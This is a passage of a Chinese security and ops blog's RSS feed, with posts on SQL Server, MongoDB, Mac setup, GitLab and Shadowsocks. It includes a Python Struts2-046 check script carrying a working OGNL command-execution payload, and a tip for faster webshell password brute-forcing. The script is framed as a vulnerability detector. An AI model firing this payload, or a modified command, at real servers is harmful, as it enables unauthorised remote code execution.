WHERE age IN (23,24)

OPEN stu_cursor --打开游标

--将游标向下移1行，并把下一行作为当前行(递归)
--游标刚打开时可以理解为指向第一行之前，所以这里就是把游标指向第一行
--然后获取游标指向行的数据
FETCH NEXT FROM stu_cursor INTO @name,@sex,@age,@hight

WHILE (@@FETCH_STATUS = 0) --判断是否成功获取数据
 BEGIN
 PRINT &amp;#39;名字: &amp;#39;+@name
 PRINT &amp;#39;性别: &amp;#39;+STR(@sex)
 PRINT &amp;#39;年龄: &amp;#39;+STR(@age)
 PRINT &amp;#39;身高: &amp;#39;+STR(@hight)
 PRINT &amp;#39;&amp;#39;

 --游标指向下一行(第二行)，然后取出这一行的数据
 FETCH NEXT FROM stu_cursor INTO @name,@sex,@age,@hight
 END

CLOSE stu_cursor --关闭游标
DEALLOCATE stu_cursor --删除游标
&lt;/code>&lt;/pre></description></item><item><title>SQLServer 的基本使用</title><link>https://wyb0.cn/posts/2017/sqlserver-basis-use/</link><pubDate>Tue, 30 May 2017 12:53:41 +0000</pubDate><guid>https://wyb0.cn/posts/2017/sqlserver-basis-use/</guid><description>&lt;h3 id="0x00-数据库">0x00 数据库&lt;/h3>
&lt;pre tabindex="0">&lt;code>-- 创建数据库
CREATE DATABASE student;

-- 选择数据库
USE student;

-- 查看当前数据库
SELECT DB_NAME();

-- 查看当前数据库
SELECT DB_NAME();

-- 查看数据库版本
SELECT @@version;
&lt;/code>&lt;/pre>&lt;h3 id="0x01-数据表">0x01 数据表&lt;/h3>
&lt;pre tabindex="0">&lt;code>-- 创建数据库表
CREATE TABLE info
(
 id INT IDENTITY(1,1) PRIMARY KEY NOT NULL,
 name VARCHAR(20) NOT NULL DEFAULT &amp;#39;xiaoming&amp;#39;,
 sex INT NOT NULL DEFAULT 1
)

-- 查看表结构
EXEC sp_help &amp;#39;info&amp;#39;;

-- 更新表结构
ALTER TABLE info add age int; -- 添加一列
ALTER TABLE info DROP COLUMN age; -- 删除一列

-- 插入数据
INSERT INTO info(name,sex)
VALUES(&amp;#39;xiaohong&amp;#39;,0);

-- 查看数据
SELECT * FROM dbo.info;

-- 更新数据
UPDATE info
SET name=&amp;#39;aaa&amp;#39;,sex=1
WHERE id=1;

-- 删除数据
DELETE info
WHERE id=1;

-- 删除表
DROP TABLE info;
&lt;/code>&lt;/pre></description></item><item><title>MongoDB 的基本使用</title><link>https://wyb0.cn/posts/2017/mongodb-basis-use/</link><pubDate>Thu, 25 May 2017 15:33:12 +0000</pubDate><guid>https://wyb0.cn/posts/2017/mongodb-basis-use/</guid><description>&lt;h3 id="0x00-角色和权限">0x00 角色和权限&lt;/h3>
&lt;p>Mongo的授权采用了角色授权的方法，每个用户都有一组权限，Monog内建角色权限如下：&lt;/p>
&lt;ul>
&lt;li>数据库用户角色
&lt;ul>
&lt;li>read：允许用户读取指定数据库&lt;/li>
&lt;li>readWrite：允许用户读写指定数据库&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>数据库管理角色
&lt;ul>
&lt;li>dbOwner：包含readWrite、dbAdmin、userAdmin&lt;/li>
&lt;li>dbAdmin：允许用户在指定数据库中对集合、文档等操作&lt;/li>
&lt;li>userAdmin：允许用户向system.users集合写入，可以在指定数据库里创建、删除和管理用户&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>集群管理角色
&lt;ul>
&lt;li>clusterAdmin：只在admin数据库中可用，包含clusterManager、clusterMonitor、hostManager&lt;/li>
&lt;li>clusterManager：&lt;/li>
&lt;li>clusterMonitor：&lt;/li>
&lt;li>hostManager&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>备份和恢复角色
&lt;ul>
&lt;li>backup&lt;/li>
&lt;li>restore&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>所有数据库角色
&lt;ul>
&lt;li>readAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读权限&lt;/li>
&lt;li>readWriteAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读写权限&lt;/li>
&lt;li>dbAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限&lt;/li>
&lt;li>userAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>超级用户角色
&lt;ul>
&lt;li>root：只在admin数据库中可用。超级账号，超级权限&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>内部角色
&lt;ul>
&lt;li>__system&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-创建用户">0x01 创建用户&lt;/h3>
&lt;pre tabindex="0">&lt;code>#创建管理员用户
&amp;gt; use admin
switched to db admin
&amp;gt; db.createUser({
... user:&amp;#34;root&amp;#34;,
... pwd:&amp;#34;root123&amp;#34;,
... roles:[{&amp;#34;role&amp;#34;:&amp;#34;root&amp;#34;,&amp;#34;db&amp;#34;:&amp;#34;admin&amp;#34;}]
... })
Successfully added user: {
 &amp;#34;user&amp;#34; : &amp;#34;root&amp;#34;,
 &amp;#34;roles&amp;#34; : [
 {
 &amp;#34;role&amp;#34; : &amp;#34;root&amp;#34;,
 &amp;#34;db&amp;#34; : &amp;#34;admin&amp;#34;
 }
 ]
}
&amp;gt; db.auth(&amp;#34;root&amp;#34;,&amp;#34;root123&amp;#34;)
1

#这个例子创建了一个名为 root 的用户管理员。创建完了这个用户之后，我们应该马上以该用户的身份登录：
#db.auth() 方法返回 1 表示登录成功。接下来我们为指定的数据库创建访问所需的账号。

#创建数据库用户
&amp;gt; use test
switched to db test
&amp;gt; db.createUser({
... user:&amp;#34;test&amp;#34;,
... pwd:&amp;#34;test123&amp;#34;,
... roles:[
... {&amp;#34;role&amp;#34;:&amp;#34;readWrite&amp;#34;,&amp;#34;db&amp;#34;:&amp;#34;test&amp;#34;},
... {&amp;#34;role&amp;#34;:&amp;#34;dbOwner&amp;#34;,&amp;#34;db&amp;#34;:&amp;#34;test&amp;#34;}]
... })
Successfully added user: {
 &amp;#34;user&amp;#34; : &amp;#34;test&amp;#34;,
 &amp;#34;roles&amp;#34; : [
 {
 &amp;#34;role&amp;#34; : &amp;#34;readWrite&amp;#34;,
 &amp;#34;db&amp;#34; : &amp;#34;test&amp;#34;
 },
 {
 &amp;#34;role&amp;#34; : &amp;#34;dbOwner&amp;#34;,
 &amp;#34;db&amp;#34; : &amp;#34;test&amp;#34;
 }
 ]
}
&amp;gt; db.auth(&amp;#34;test&amp;#34;,&amp;#34;test123&amp;#34;)
1
&amp;gt; exit
bye
&lt;/code>&lt;/pre>&lt;h3 id="0x02-配置">0x02 配置&lt;/h3>
&lt;p>MongoDb版本：version v3.4.4&lt;/p></description></item><item><title>Mac 基础设置</title><link>https://wyb0.cn/posts/2017/mac-basic-use/</link><pubDate>Fri, 19 May 2017 16:51:11 +0000</pubDate><guid>https://wyb0.cn/posts/2017/mac-basic-use/</guid><description>&lt;p>macOS Sierra 10.12.6&lt;/p>
&lt;h3 id="0x00-安装brew">0x00 安装brew&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ /usr/bin/ruby -e &amp;#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="0x01-安装wget">0x01 安装wget&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ brew install wget
&lt;/code>&lt;/pre>&lt;h3 id="0x02-安装oh-my-zsh">0x02 安装oh-my-zsh&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
$ cat /etc/shells #查看当前有什么shell
$ which zsh #查看zsh路径
$ chsh -s /bin/zsh #切换shell为zsh
$ vim ~/.zshrc添加alias c=&amp;#39;clear&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x03-换源">0x03 换源&lt;/h3>
&lt;pre tabindex="0">&lt;code># 对于zsh用户换源
$ echo &amp;#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&amp;#39; &amp;gt;&amp;gt; ~/.zshrc
$ source ~/.zshrc
$ brew update
&lt;/code>&lt;/pre>&lt;h3 id="0x04-安装scroll-reverser">0x04 安装scroll-reverser&lt;/h3>
&lt;blockquote>
&lt;p>去&lt;a href="http://pilotmoon.com/scrollreverser?_blank">http://pilotmoon.com/scrollreverser&lt;/a>下载&lt;/p></description></item><item><title>Struts2-046 EXP</title><link>https://wyb0.cn/posts/2017/struts2-046/</link><pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate><guid>https://wyb0.cn/posts/2017/struts2-046/</guid><description>&lt;h3 id="struts2-046">Struts2 046&lt;/h3>
&lt;p>前段时间写的struts2 046检测脚本，代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber

import sys
import pycurl
import StringIO


def initCurl():
 c = pycurl.Curl()
 c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源
 c.setopt(pycurl.MAXREDIRS, 5)
 # c.setopt(pycurl.PROXY,&amp;#39;http://127.0.0.1:1080&amp;#39;)
 return c

def check(curl, url):
 head = [
 &amp;#39;Connection: close&amp;#39;,
 &amp;#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&amp;#39;
 ]

 data = &amp;#39;&amp;#39;&amp;#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;#34;foo&amp;#34;; filename=&amp;#34;%{(#nike=&amp;#39;multipart/form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;#39;com.opensymphony.xwork2.ActionContext.container&amp;#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&amp;#39;echo dd996b71024fa97cd015f06a7f24ed30&amp;#39;).(#iswin=(@java.lang.System@getProperty(&amp;#39;os.name&amp;#39;).toLowerCase().contains(&amp;#39;win&amp;#39;))).(#cmds=(#iswin?{&amp;#39;cmd.exe&amp;#39;,&amp;#39;/c&amp;#39;,#cmd}:{&amp;#39;/bin/bash&amp;#39;,&amp;#39;-c&amp;#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;#34;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&amp;#39;&amp;#39;&amp;#39;

 buf = StringIO.StringIO()
 curl.setopt(pycurl.WRITEFUNCTION, buf.write)
 curl.setopt(pycurl.POSTFIELDS, data)
 curl.setopt(pycurl.URL, url)
 # curl.setopt(pycurl.TIMEOUT, 10)
 curl.setopt(pycurl.HTTPHEADER, head)
 curl.setopt(pycurl.SSL_VERIFYPEER, 0)
 curl.setopt(pycurl.SSL_VERIFYHOST, 0)
 curl.perform()
 the_page = buf.getvalue()
 buf.close()

 if &amp;#39;dd996b71024fa97cd015f06a7f24ed30&amp;#39; in the_page:
 print &amp;#34;%s has st2-046 vulnerable.&amp;#34; % url

def run(url):
 c = initCurl()
 check(c, url)
 sys.exit(0)

if __name__ == &amp;#39;__main__&amp;#39;:
 if len(sys.argv) == 2:
 url = sys.argv[1]
 run(url)
 else:
 print (&amp;#34;usage: %s http://www.baidu.com/vuln.action whoami&amp;#34; % sys.argv[0])
 sys.exit(-1)
&lt;/code>&lt;/pre></description></item><item><title>检测 WebLogic 是否存在 SSRF</title><link>https://wyb0.cn/posts/2017/weblogic-ssrf-check/</link><pubDate>Fri, 14 Apr 2017 14:43:52 +0000</pubDate><guid>https://wyb0.cn/posts/2017/weblogic-ssrf-check/</guid><description>&lt;h3 id="0x00-weblogic返回状态">0x00 weblogic返回状态&lt;/h3>
&lt;p>weblogic的ssrf漏洞测试3种状态，返回如下：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>同网段不存在的主机
&lt;img src="https://wyb0.cn/img/post/weblogic-check-host-down.png" alt="">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>同网段主机存活但端口不开放
&lt;img src="https://wyb0.cn/img/post/weblogic-check-host-up-port-down.png" alt="">&lt;/p></description></item><item><title>XSS 中的编码</title><link>https://wyb0.cn/posts/2017/xss-encode/</link><pubDate>Thu, 30 Mar 2017 15:25:37 +0000</pubDate><guid>https://wyb0.cn/posts/2017/xss-encode/</guid><description>&lt;p>&lt;img src="https://wyb0.cn/img/anime/anime006.jpg" alt="攻壳机动队">&lt;/p>
&lt;h3 id="0x00-浏览器解析">0x00 浏览器解析&lt;/h3>
&lt;pre tabindex="0">&lt;code>浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时，
会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容，
对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本，
在这之前它是HTML的一部分
&lt;/code>&lt;/pre>&lt;h3 id="0x01-一些编码">0x01 一些编码&lt;/h3>
&lt;ul>
&lt;li>URL编码&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>%+字符的ASCII编码对应的两位十六进制，如&amp;#34;/&amp;#34;的url编码为&amp;#34;%2F&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>HTML编码&lt;/p></description></item><item><title>在 vps 上搭建 Shadowsocks</title><link>https://wyb0.cn/posts/2017/vps-set-up-shadowsocks/</link><pubDate>Fri, 10 Mar 2017 10:34:40 +0000</pubDate><guid>https://wyb0.cn/posts/2017/vps-set-up-shadowsocks/</guid><description>&lt;p>&lt;img src="https://wyb0.cn/img/anime/anime005.jpg" alt="某科学的超电磁炮">&lt;/p>
&lt;h3 id="0x01-安装与配置">0x01 安装与配置&lt;/h3>
&lt;p>环境：Ubuntu 14.04.1 LTS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>reber@localhost:~$ sudo apt-get update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reber@localhost:~$ python --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Python 2.7.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reber@localhost:~$ sudo apt-get install python-gevent python-pip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reber@localhost:~$ sudo pip install shadowsocks
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reber@localhost:~$ vim /home/reber/shadowsocks.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;server&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;服务器 IP 地址&amp;#34;&lt;/span>, &lt;span style="color:#75715e"># 服务器 IP (IPv4/IPv6)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;server_port&amp;#34;&lt;/span>:8388, &lt;span style="color:#75715e"># 监听的服务器端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;local_address&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>, &lt;span style="color:#75715e"># 本地监听的 IP 地址&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;local_port&amp;#34;&lt;/span>:1080, &lt;span style="color:#75715e"># 本地端端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;mypassword&amp;#34;&lt;/span>, &lt;span style="color:#75715e"># 密码&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&amp;#34;port_password&amp;#34;:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40001&amp;#34;: &amp;#34;password1&amp;#34;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40002&amp;#34;: &amp;#34;password2&amp;#34;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40003&amp;#34;: &amp;#34;password3&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&amp;#34;_comment&amp;#34;:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40001&amp;#34;: &amp;#34;xiaoming&amp;#34;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40002&amp;#34;: &amp;#34;lilei&amp;#34;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#34;40003&amp;#34;: &amp;#34;mike&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;timeout&amp;#34;&lt;/span>:300, &lt;span style="color:#75715e"># 超时时间（秒）&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;method&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;aes-256-cfb&amp;#34;&lt;/span>, &lt;span style="color:#75715e"># 加密方式&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 若Linux内核在3.7+，可开启fast_open降低延迟&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 开启方法：echo 3 &amp;gt; /proc/sys/net/ipv4/tcp_fastopen&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;fast_open&amp;#34;&lt;/span>: false, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;workers&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e"># works数量，默认为 1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>reber@localhost:~$ sudo apt-get install python-m2crypto
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-服务端启动">0x02 服务端启动&lt;/h3>
&lt;pre tabindex="0">&lt;code># 前台运行
reber@localhost:~$ sudo ssserver -c /home/reber/shadowsocks.json
# 后台运行
reber@localhost:~$ sudo nohup ssserver -c /home/reber/shadowsocks.json &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
# 关闭服务
reber@localhost:~$ sudo killall ssserver 
&lt;/code>&lt;/pre>&lt;h4 id="0x03-本地使用">0x03 本地使用&lt;/h4>
&lt;blockquote>
&lt;p>添加如下配置
&lt;img src="https://wyb0.cn/img/post/use_ss.png" alt="使用Shadowsocks">&lt;/p></description></item><item><title>利用多参数提高 webshell 爆破速度</title><link>https://wyb0.cn/posts/2017/multi-parameter-blasting-webshell/</link><pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate><guid>https://wyb0.cn/posts/2017/multi-parameter-blasting-webshell/</guid><description>&lt;h3 id="0x00-原理">0x00 原理&lt;/h3>
&lt;p>之前在&lt;a href="https://www.t00ls.net/viewthread.php?tid=36985">https://www.t00ls.net/viewthread.php?tid=36985&lt;/a>看到这个思路的。&lt;/p>
&lt;p>Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。&lt;/p></description></item><item><title>301 重定向</title><link>https://wyb0.cn/posts/2017/301-redirect/</link><pubDate>Tue, 07 Feb 2017 10:49:38 +0000</pubDate><guid>https://wyb0.cn/posts/2017/301-redirect/</guid><description>&lt;h3 id="0x00-目的">0x00 目的&lt;/h3>
&lt;pre tabindex="0">&lt;code>由于博客更换了域名，原来百度收录的都成了死链，所以做一下301重定向
我使用的是github搭建的博客，都是html的文件，先把html文件都上传到自己的服务器上，
修改dns使原域名指向服务器，让百度收录的链接都能够访问，然后设置301

服务器环境：Ubuntu 14.04.5、Apache2
&lt;/code>&lt;/pre>&lt;h3 id="0x01-开启rewrite模块">0x01 开启rewrite模块&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ sudo a2enmod rewrite
&lt;/code>&lt;/pre>&lt;h3 id="0x02-根目录下新建htaccess">0x02 根目录下新建.htaccess：&lt;/h3>
&lt;pre tabindex="0">&lt;code>Options +FollowSymLinks
RewriteEngine on
RewriteRule ^(.*)$ http://wyb0.com/$1 [L,R=301] # 这里换上新域名
&lt;/code>&lt;/pre>&lt;h3 id="0x03-修改配置文件">0x03 修改配置文件&lt;/h3>
&lt;pre tabindex="0">&lt;code># AllowOverride None 改为AllowOverride All

$ sudo vim /etc/apache2/apache2.conf
&amp;lt;Directory /var/www/&amp;gt;
 Options FollowSymLinks
 AllowOverride All
 Require all granted
&amp;lt;/Directory&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="0x04-重启apache">0x04 重启Apache&lt;/h3>
&lt;pre tabindex="0">&lt;code>$ sudo /etc/init.d/apache2 restart
&lt;/code>&lt;/pre></description></item><item><title>Ubuntu 下部署 Gitlab</title><link>https://wyb0.cn/posts/2017/ubuntu-set-up-gitlab/</link><pubDate>Mon, 16 Jan 2017 20:18:05 +0000</pubDate><guid>https://wyb0.cn/posts/2017/ubuntu-set-up-gitlab/</guid><description>&lt;p>&lt;img src="https://wyb0.cn/img/anime/anime004.jpg" alt="钢之炼金术师FA">&lt;/p>
&lt;h3 id="0x00-前期准备">0x00 前期准备&lt;/h3>
&lt;pre tabindex="0">&lt;code># 环境 Ubuntu 14.04
reber@ubuntu:~/Desktop$ sudo apt-get install openssh-server
reber@ubuntu:~/Desktop$ sudo apt-get install openssh-client
reber@ubuntu:~/Desktop$ sudo apt-get install git
&lt;/code>&lt;/pre>&lt;h3 id="0x01-安装">0x01 安装&lt;/h3>
&lt;pre tabindex="0">&lt;code>reber@ubuntu:~/Desktop$ wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_8.8.0-ce.0_amd64.deb
reber@ubuntu:~/Desktop$ sudo dpkg -i gitlab-ce_8.8.0-ce.0_amd64.deb
&lt;/code>&lt;/pre>&lt;h3 id="0x02-配置">0x02 配置&lt;/h3>
&lt;pre tabindex="0">&lt;code>reber@ubuntu:~/Desktop$ sudo vim /etc/gitlab/gitlab.rb
 external_url &amp;#39;http://192.168.188.160:80&amp;#39;
 ......
 gitlab_rails[&amp;#39;time_zone&amp;#39;] = &amp;#39;Asia/Shanghai&amp;#39;
 gitlab_rails[&amp;#39;gitlab_email_from&amp;#39;] = &amp;#39;xxxxxx@163.com&amp;#39;
 ......
 gitlab_rails[&amp;#39;smtp_enable&amp;#39;] = true
 gitlab_rails[&amp;#39;smtp_address&amp;#39;] = &amp;#34;smtp.163.com&amp;#34;
 gitlab_rails[&amp;#39;smtp_port&amp;#39;] = 25
 gitlab_rails[&amp;#39;smtp_user_name&amp;#39;] = &amp;#34;xxxxxx@163.com&amp;#34;
 gitlab_rails[&amp;#39;smtp_password&amp;#39;] = &amp;#34;111111&amp;#34; # 客户端授权密码
 gitlab_rails[&amp;#39;smtp_domain&amp;#39;] = &amp;#34;163.com&amp;#34;
 gitlab_rails[&amp;#39;smtp_authentication&amp;#39;] = &amp;#34;login&amp;#34;
 gitlab_rails[&amp;#39;smtp_enable_starttls_auto&amp;#39;] = true
 ......
 user[&amp;#34;git_user_email&amp;#34;] = &amp;#34;xxxxxx@163.com&amp;#34;
# 只要修改配置文件就要reconfigure
reber@ubuntu:~/Desktop$ sudo gitlab-ctl reconfigure 
reber@ubuntu:~/Desktop$ sudo gitlab-ctl status
run: gitlab-workhorse: (pid 15918) 16s; run: log: (pid 15290) 200s
run: logrotate: (pid 15310) 187s; run: log: (pid 15309) 187s
run: nginx: (pid 15297) 193s; run: log: (pid 15296) 193s
run: postgresql: (pid 15169) 258s; run: log: (pid 15168) 258s
run: redis: (pid 15076) 269s; run: log: (pid 15075) 269s
run: sidekiq: (pid 15384) 141s; run: log: (pid 15279) 206s
run: unicorn: (pid 15360) 158s; run: log: (pid 15246) 212s
reber@ubuntu:~/Desktop$ netstat -anlt
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address Foreign Address State
tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN
tcp 0 0 127.0.1.1:53 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN

# 其中8080是unicore的端口
# 80是nginx的端口，nginx反向代理ruby开的web服务unicore
&lt;/code>&lt;/pre>&lt;h3 id="0x03-访问web页面">0x03 访问web页面&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>有时出现502，可以刷新网页或者再次reconfigure&lt;/p></description></item><item><title>[转] JS 操作 cookie 方法的封装</title><link>https://wyb0.cn/posts/2016/js-package-cookie-function/</link><pubDate>Tue, 27 Dec 2016 11:49:38 +0000</pubDate><guid>https://wyb0.cn/posts/2016/js-package-cookie-function/</guid><description>&lt;p>原文链接：http://www.wyzu.cn/2015/0123/107167.html&lt;/p>
&lt;h3 id="0x00-实现功能">0x00 实现功能&lt;/h3>
&lt;ul>
&lt;li>添加cookie&lt;/li>
&lt;li>获取所有cookie&lt;/li>
&lt;li>根据名字获取单个cookie的值&lt;/li>
&lt;li>移除所有cookie&lt;/li>
&lt;li>根据名字移除单个cookie&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-封装cookiejs源码">0x01 封装cookie.js源码&lt;/h3>
&lt;pre tabindex="0">&lt;code>/*
 * 名称和值传送时必须是经过RUL编码的
 * cookie绑定在指定的域名下，非本域无法共享cookie，但是可以是在主站共享cookie给子站
 * cookie的名称不分大小写；同时建议将cookie URL编码
 * 建议针对cookie设置expires、domain、 path；每个cookie小于4KB
 **/

(function(global){
 function getCookiesObj() {
 //获得cookie对象
 var cookies = {};
 if (document.cookie) {
 var objs = document.cookie.split(&amp;#39;; &amp;#39;);
 for (var i in objs) {
 var index = objs[i].indexOf(&amp;#39;=&amp;#39;),
 name = objs[i].substr(0,index),
 value = objs[i].substr(index+1,objs[i].length);
 cookies[name] = value;
 }
 }
 return cookies;
 }

 function set(sName,sValue,Opts) {
 //设置cookie
 // Opts expires,path,domain,secure
 if (sName &amp;amp;&amp;amp; sValue) {
 var cookie = encodeURIComponent(sName)+&amp;#39;=&amp;#39;+encodeURIComponent(sValue);
 
 if (Opts) {
 if (Opts.expires) {
 var date = new Date();
 date.setTime(date.getTime()+Opts.expires*24*3600*1000)
 cookie += &amp;#39;; expires=&amp;#39; + date.toGMTString();
 }
 if (Opts.path) {
 cookie += &amp;#39;; path=&amp;#39; + Opts.path;
 }
 if (Opts.domain) {
 cookie += &amp;#39;; domain=&amp;#39; + Opts.domain;
 }
 if (Opts.secure) {
 cookie += &amp;#39;; secure&amp;#39;;
 }
 }
 document.cookie = cookie;
 return cookie;
 } else {
 return &amp;#39;&amp;#39;;
 }
 }

 function getCookie(name) {
 //得到某个cookie
 return decodeURIComponent(getCookiesObj()[name]) || null;
 }

 function getCookies() {
 //得到所有cookie
 return getCookiesObj();
 }

 function remove(name) {
 //移除某个cookie
 if (getCookiesObj()[name]) {
 var date = new Date();
 date.setDate(date.getDate()-1);
 document.cookie = name + &amp;#39;=; expires=&amp;#39;+date.toGMTString();
 }
 }

 function clear() {
 // 移除所有cookie
 var cookies = getCookiesObj();
 var date = new Date();
 date.setDate(date.getDate()-1);
 for (var key in cookies) {
 document.cookie = key + &amp;#39;=; expires=&amp;#39;+date.toGMTString();
 }
 }

 function noConflict(name) {
 //解决冲突
 if (name &amp;amp;&amp;amp; typeof name === &amp;#39;string&amp;#39;) {
 if (name &amp;amp;&amp;amp; window[&amp;#39;cookie&amp;#39;]) {
 window[name] = window[&amp;#39;cookie&amp;#39;];
 delete window[&amp;#39;cookie&amp;#39;];
 return window[name];
 }
 } else {
 return window[&amp;#39;cookie&amp;#39;];
 delete window[&amp;#39;cookie&amp;#39;];
 }
 }

 global[&amp;#39;cookie&amp;#39;] = {
